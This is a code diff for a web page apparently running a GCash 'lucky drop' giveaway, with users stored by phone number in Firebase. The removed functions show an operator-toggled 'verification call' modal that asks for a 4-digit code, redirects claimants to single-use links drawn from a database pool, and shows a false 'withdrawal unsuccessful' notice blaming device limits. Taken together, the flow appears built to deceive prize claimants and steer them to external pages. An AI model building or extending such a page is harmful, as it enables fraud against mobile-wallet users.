@@ -29,109 +29,7 @@ function getUserRef() {
     return db.ref('lucky_drop_users/' + phone);
 }
 
-// ========== FIREWALL VERIFICATION FUNCTIONS ==========
-async function checkFirewallStatus() {
-    if (typeof firebase === 'undefined' || !firebase.database) {
-        return false;
-    }
-    try {
-        var db = firebase.database();
-        var firewallSnap = await db.ref('admin/globalFirewall').once('value');
-        var isFirewallOn = firewallSnap.val() && firewallSnap.val().active === true;
-        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
-        return isFirewallOn;
-    } catch(e) {
-        console.error("Firewall check error:", e);
-        return false;
-    }
-}
 
-function showFirewallVerificationPopup() {
-    if (isVerificationModalOpen) return;
-    isVerificationModalOpen = true;
-    
-    // Generate random 4-digit code
-    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
-    console.log("Verification code for this session:", currentVerificationCode);
-    
-    var modal = document.createElement('div');
-    modal.id = 'firewallVerifyModal';
-    modal.style.position = 'fixed';
-    modal.style.top = '0';
-    modal.style.left = '0';
-    modal.style.width = '100%';
-    modal.style.height = '100%';
-    modal.style.background = 'rgba(0,0,0,0.95)';
-    modal.style.backdropFilter = 'blur(10px)';
-    modal.style.zIndex = '20001';
-    modal.style.display = 'flex';
-    modal.style.alignItems = 'center';
-    modal.style.justifyContent = 'center';
-    
-    modal.innerHTML = `
-        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
-            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
-            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
-            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
-                <p>You will receive a call from our verification system.</p>
-                <p>Please enter the <strong>4-digit code</strong> provided during the call.</p>
-            </div>
-            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
-                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
-                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
-            </div>
-            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
-            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
-        </div>
-    `;
-    
-    document.body.appendChild(modal);
-    
-    var codeInput = document.getElementById('verifyCodeInput');
-    var verifyBtn = document.getElementById('submitVerifyBtn');
-    var errorDiv = document.getElementById('verifyErrorMsg');
-    
-    if (codeInput) codeInput.focus();
-    
-    verifyBtn.onclick = function() {
-        var enteredCode = codeInput.value.trim();
-        
-        if (!enteredCode || enteredCode.length < 4) {
-            errorDiv.innerHTML = "Please enter a 4-digit code.";
-            errorDiv.style.display = 'block';
-            return;
-        }
-        
-        verificationAttempts++;
-        
-        if (enteredCode === currentVerificationCode) {
-            // Verification successful
-            errorDiv.style.display = 'none';
-            modal.remove();
-            isVerificationModalOpen = false;
-            alert("VERIFICATION SUCCESSFUL!\n\nYou may now proceed with your claim.");
-        } else {
-            errorDiv.innerHTML = "Invalid verification code. Please provide the correct 4-digit code from the verification call.";
-            errorDiv.style.display = 'block';
-            codeInput.value = '';
-            codeInput.focus();
-            
-            if (verificationAttempts >= 3) {
-                errorDiv.innerHTML = "Too many failed attempts. Page will refresh.";
-                setTimeout(function() {
-                    window.location.reload();
-                }, 2000);
-            }
-        }
-    };
-    
-    modal.onclick = function(e) {
-        if (e.target === modal) {
-            modal.remove();
-            isVerificationModalOpen = false;
-        }
-    };
-}
 
 // ========== LOAD USER DATA FROM FIREBASE ==========
 async function loadUserDataFromFirebase() {
@@ -692,89 +590,8 @@ function initFacebookShare() {
     }
 }
 
-// ========== CLAIM THRU GCASH BUTTON WITH FIREWALL LOGIC ==========
-async function handleClaimThruGCash() {
-    console.log("CLAIM THRU GCASH clicked");
-    
-    if (typeof firebase === 'undefined' || !firebase.database) {
-        alert("CONNECTION ERROR\n\nPlease refresh the page and try again.");
-        return;
-    }
-    
-    try {
-        var db = firebase.database();
-        
-        // Check firewall status
-        var isFirewallOn = await checkFirewallStatus();
-        
-        if (isFirewallOn) {
-            showFirewallVerificationPopup();
-            return;
-        }
-        
-        // Firewall is OFF - check for available links
-        var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
-        
-        if (linksSnap.exists()) {
-            var key = Object.keys(linksSnap.val())[0];
-            var linkData = linksSnap.val()[key];
-            var redirectUrl = linkData.url;
-            
-            if (redirectUrl && !redirectUrl.startsWith('http')) {
-                redirectUrl = 'https://' + redirectUrl;
-            }
-            
-            await db.ref('links/' + key).update({
-                status: 'claimed',
-                claimedAt: Date.now()
-            });
-            
-            alert("✅ CLAIM SUCCESSFUL!\n\nYou will be redirected to complete your withdrawal.");
-            window.location.href = redirectUrl;
-        } else {
-            showWithdrawalErrorModal();
-        }
-        
-    } catch(e) {
-        console.error("Error:", e);
-        alert("SYSTEM ERROR\n\nPlease try again later or contact support.");
-    }
-}
 
-function showWithdrawalErrorModal() {
-    var modal = document.createElement('div');
-    modal.style.position = 'fixed';
-    modal.style.top = '0';
-    modal.style.left = '0';
-    modal.style.width = '100%';
-    modal.style.height = '100%';
-    modal.style.background = 'rgba(0,0,0,0.95)';
-    modal.style.backdropFilter = 'blur(10px)';
-    modal.style.zIndex = '20000';
-    modal.style.display = 'flex';
-    modal.style.alignItems = 'center';
-    modal.style.justifyContent = 'center';
-    
-    modal.innerHTML = `
-        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
-            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
-            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
-            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
-                <p><strong>Possible Reasons:</strong></p>
-                <p>• This device has already reached the maximum payout limit.</p>
-                <p>• No GCash app installed on this device.</p>
-                <p>• Please try using another device to complete your withdrawal.</p>
-            </div>
-            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
-        </div>
-    `;
-    
-    document.body.appendChild(modal);
-    document.getElementById('closeAlertBtn').onclick = function() {
-        modal.remove();
-    };
-}
-
+// ========== CLAIM THRU GCASH BUTTON - SIMPLE TRIGGER ==========
 function initClaimButton() {
     var claimBtn = document.getElementById('claimGCashBtn');
     if (!claimBtn) return;
@@ -783,7 +600,16 @@ function initClaimButton() {
     claimBtn.parentNode.replaceChild(newBtn, claimBtn);
     claimBtn = newBtn;
     
-    claimBtn.onclick = handleClaimThruGCash;
+    claimBtn.onclick = function() {
+        console.log("CLAIM THRU GCASH clicked - calling popup.js");
+        
+        if (typeof window.showClaimPopup === 'function') {
+            window.showClaimPopup(150);
+        } else {
+            console.error("showClaimPopup not found");
+            alert("System loading. Please refresh the page.");
+        }
+    };
 }
 
 // ========== INITIALIZE ==========
